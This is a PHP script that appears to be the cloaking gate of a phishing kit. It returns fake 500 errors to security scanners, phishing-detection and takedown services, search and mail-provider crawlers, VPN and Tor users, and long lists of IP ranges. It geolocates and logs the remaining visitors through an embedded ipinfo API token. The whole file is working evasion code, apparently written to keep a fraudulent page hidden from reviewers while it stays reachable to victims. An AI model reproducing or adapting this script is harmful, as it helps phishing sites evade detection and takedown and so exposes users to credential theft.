<?php
// Include any necessary files or configurations here

// Block requests from bots based on User-Agent
if (preg_match('/bot|crawler|spider|facebook|alexa|twitter|curl/i', $_SERVER['HTTP_USER_AGENT'])) {
    logger("[BOT] {$_SERVER['REQUEST_URI']} - 500");
    header('HTTP/1.1 500 Internal Server Error');
    exit();
}

function getOS() {
    $oses = array (
        'iPhone'         => '(iPhone)',
        'Windows 3.11'   => 'Win16',
        'Windows 95'     => '(Windows 95)|(Win95)|(Windows_95)',
        'Windows 98'     => '(Windows 98)|(Win98)',
        'Windows 2000'   => '(Windows NT 5.0)|(Windows 2000)',
        'Windows XP'     => '(Windows NT 5.1)|(Windows XP)',
        'Windows 2003'   => '(Windows NT 5.2)',
        'Windows Vista'  => '(Windows NT 6.0)|(Windows Vista)',
        'Windows 7'      => '(Windows NT 6.1)|(Windows 7)',   
        'Windows 8'      => '(Windows NT 6.2)',
        'Windows 10'     => '(Windows NT 10.0)',
        'Windows NT 4.0' => '(Windows NT 4.0)|(WinNT4.0)|(WinNT)|(Windows NT)',
        'Windows ME'     => 'Windows ME',
        'Open BSD'       => 'OpenBSD',
        'Sun OS'         => 'SunOS',
        'Linux'          => '(Linux)|(X11)',
        'Safari'         => '(Safari)',
        'Mac OS'         => '(Mac_PowerPC)|(Macintosh)',
        'QNX'            => 'QNX',
        'BeOS'           => 'BeOS',
        'OS/2'           => 'OS/2'
    );
    
    foreach ($oses as $os => $preg_pattern) {
        if (preg_match("#$preg_pattern#", $_SERVER['HTTP_USER_AGENT'])) {
            return $os;
        }
    }

    return 'N/A';
}

function logger($data) {
    $today = date('l, d F H:i:s');
    $visit = geoip();
    $os    = getOS();

    $fopen = fopen('logs/access.log', 'a+');
    fwrite($fopen, "[$today] $data [{$_SERVER['REMOTE_ADDR']} - {$visit['city']}, {$visit['country']} - $os - {$_SERVER['HTTP_USER_AGENT']}]\n");
    fclose($fopen);
}

function geoip() {
    $ip = $_SERVER['REMOTE_ADDR'];
    if (in_array($ip, ['127.0.0.1', '::1', 'localhost'])) {
        return []; // Or handle local requests differently
    }
    $apiUrl = "https://ipinfo.io/{$ip}/json?token=560b5deec8f118";
    $response = @file_get_contents($apiUrl);
    if ($response === false) {
        return [];
    }
    return json_decode($response, true);
}

function isVPN($ip) {
    $apiUrl = "https://ipinfo.io/{$ip}/json?token=560b5deec8f118";
    $response = @file_get_contents($apiUrl);
    if ($response === false) {
        return false;
    }

    $data = json_decode($response, true);
    return isset($data['privacy']) && $data['privacy']['vpn'] === true;
}


$ip = $_SERVER['REMOTE_ADDR'];
if (isVPN($ip)) {
    header("HTTP/1.1 500 Internal Server Error");
    die("<h1>500 Internal Server Error</h1>Something went wrong on the server.");
}

// List of blocked IP patterns
$ips = array(
    "^94.26.*.*", "^95.85.*.*", "^72.52.96.*", "^212.8.79.*", "^62.99.77.*", "^83.31.118.*", "^91.231.*.*", "^206.207.*.*", "^91.231.212.*", "^62.99.77.*", "^198.41.243.*", "^162.158.*.*", "^162.158.7.*", "^162.158.72.*", "^173.245.55.*", "^108.162.246.*", "^162.158.95.*", "^108.162.215.*", "^95.108.194.*", "^141.101.104.*", "^93.54.82.*", "^69.164.145.*", "^194.153.113.*", "^178.43.117.*", "^62.141.65.*", "^83.31.69.*", "^107.178.195.*", "^149.20.54.*", "^85.9.7.*", "^87.106.251.*", "^107.178.194.*", "^124.66.185.*", "^133.11.204.*", "^185.2.138.*", "^188.165.83.*", "^78.148.13.*", "^192.232.213.*", "^1.234.41.*", "^124.66.185.*", "^87.106.251.*", "^176.195.231.*", "^206.253.226.*", "^107.20.181.*", "^188.244.39.*", "^124.66.185.*", "^38.74.138.*", "^124.66.185.*", "^38.74.138.*", "^206.253.226.*", "^1.234.41.*", "^124.66.185.*", "^87.106.251.*", "^85.9.7.*", "^37.140.188.*", "^195.128.227.*", "^38.74.138.*", "^107.20.181.*", "^104.131.223.*", "^46.4.120.*", "^107.178.194.*", "^198.60.236.*", "^217.74.103.*", "^92.103.69.*", "^217.74.103.*", "^66.211.160.86*", "^46.244.*.*", "^131.120.12.*", "^157.201.10.*", "^172.217.*.*", "^104.132.*.*", "^103.86.99.*", "^213.100.*.*", "^104.146.*.*", "^216.58.*.*", "^173.194.*.*", "^74.125.133.*", "^104.16.*.*", "^64.233.*.*", "^64.233.160.*", "^64.233.191.*", "^64.233.191.255*",  "^66.102.*.*", "^66.249.*.*", "^72.14.*.*", "^74.125.*.*", "^209.85.*.*", "^216.239.*.*", "^64.4.*.*", "^65.52.*.*", "^131.253.*.*", "^157.54.*.*", "^207.46.*.*", "^207.68.*.*", "^8.12.*.*", "^66.196.*.*", "^66.228.*.*", "^67.195.*.*", "^68.142.*.*", "^72.30.*.*", "^74.6.*.*", "^98.136.*.*", "^202.160.*.*", "^209.191.*.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*","^184.165.*.*","^198.68.61.*","^199.3.10.*","^204.119.24.*","^204.251.90.*","^100.43.*.*","^72.94.249.*","^103.6.76.*","^104.193.88.*","^106.12.*.*","^115.231.36.*","^5.189.*.*"
);

foreach ($ips as $ipPattern) {
    if (preg_match('/' . $ipPattern . '/', $_SERVER['REMOTE_ADDR'])) {
        $file = fopen("block_bot.txt", "a");
        fwrite($file, " user-agent : " . $_SERVER['HTTP_USER_AGENT'] . "\n ip : " . $_SERVER['REMOTE_ADDR'] . " || " . gmdate("Y-n-d") . " ----> " . gmdate("H:i:s") . "\n\n");
       header("HTTP/1.0 500 Internal Server Error");
    die("<h1>500 Internal Server Error</h1>There was an error processing your request.");
}
}

// List of blocked user-agent patterns
$blocked_words = array(
    "bot", "above", "google", "softlayer", "amazonaws", "cyveillance", "phishtank", "dreamhost",
    "netpilot", "calyxinstitute", "tor-exit", "apache-httpclient", "lssrocketcrawler", "crawler",
    "urlredirectresolver", "jetbrains", "spam", "windows 95", "windows 98", "acunetix", "netsparker",
    "007ac9", "008", "Feedfetcher", "192.comagent", "200pleasebot", "360spider", "4seohuntbot", "50.nu",
    "a6-indexer", "admantx", "amznkassocbot", "aboundexbot", "aboutusbot", "abrave spider", "accelobot",
    "acoonbot", "addthis.com", "adsbot-google", "ahrefsbot", "alexabot", "amagit.com", "analytics", "antbot",
    "apercite", "aportworm", "EBAY", "CL0NA", "jabber", "ebay", "arabot", "hotmail!", "msn!", "baidu",
    "outlook!", "outlook", "msn", "duckduckbot", "hotmail",
);

$dp = strtolower($_SERVER['HTTP_USER_AGENT']);
foreach ($blocked_words as $word2) {
    if (substr_count($dp, strtolower($word2)) > 0 || $dp == "" || $dp == " " || $dp == "	") {
        $file = fopen("bot-_-.txt", "a");
        fwrite($file, " user-agent : " . $_SERVER['HTTP_USER_AGENT'] . "\n ip : " . $_SERVER['REMOTE_ADDR'] . " || " . gmdate("Y-n-d") . " ----> " . gmdate("H:i:s") . "\n\n");
        header("HTTP/1.0 500 Internal Server Error");
    die("<h1>500 Internal Server Error</h1>There was an error processing your request.");
}
}


$botPatterns = array(
    "/bot/i", "/crawl/i", "/spider/i", "/fetch/i", "/index/i", "/scrape/i", "/archive/i",
    "/bot\./i", "/bot\//i", "/_bot/i", "/\.bot/i", "/-bot/i", "/:bot/i", "/\(bot/i",
    "/bingbot/i", "/msnbot/i", "/slackbot/i", "/facebookexternalhit/i", "/twitterbot/i",
    "/googlebot/i", "/yahoo/i", "/yandex/i", "/baiduspider/i", "/semrushbot/i", "/majestic/i",
    "/alexa/i", "/w3c_validator/i", "/linkwalker/i", "/feedfetcher/i",
    "/phishing/i", "/phishingbot/i", "/phishingscanner/i",
    "/msnsearch/i", "/microsoft office/i", "/msnbot/i", "/msnbot/i", "/msnbot/1.0/i",
    "/msnbot/2.0/i", "/msn-search/i", "/msn-websearch/i", "/microsoft-webcrawler/i",
    "/ms-search/i", "/msn-slurp/i",
    "/funnelweb/i", "/gazz/i", "/gcreep/i", "/genieknows/i", "/getterroboplus/i", "/geturl/i",
    "/glx/i", "/goforit/i", "/golem/i", "/grabber/i", "/grapnel/i", "/gralon/i", "/griffon/i",
    "/gromit/i", "/grub/i", "/gulliver/i", "/hamahakki/i", "/harvest/i", "/havindex/i", "/helix/i",
    "/heritrix/i", "/hku www octopus/i", "/homerweb/i", "/htdig/i", "/html index/i", "/html_analyzer/i",
    "/htmlgobble/i", "/hubater/i", "/hyper-decontextualizer/i", "/ia_archiver/i", "/ibm_planetwide/i",
    "/ichiro/i", "/iconsurf/i", "/iltrovatore/i", "/image\.kapsi\.net/i", "/imagelock/i", "/incywincy/i",
    "/indexer/i", "/infobee/i", "/informant/i", "/ingrid/i"
);

function isBot($userAgent) {
    global $botPatterns;
    foreach ($botPatterns as $pattern) {
        if (preg_match($pattern, $userAgent)) {
            return true;
        }
    }
    return false;
}



// Check if the User-Agent is a bot
if (isBot($_SERVER['HTTP_USER_AGENT'])) {
    header("HTTP/1.1 500 Internal Server Error");
    die("<h1>500 Internal Server Error</h1>The request could not be processed due to a server error.");
}


// Your remaining script logic here
?>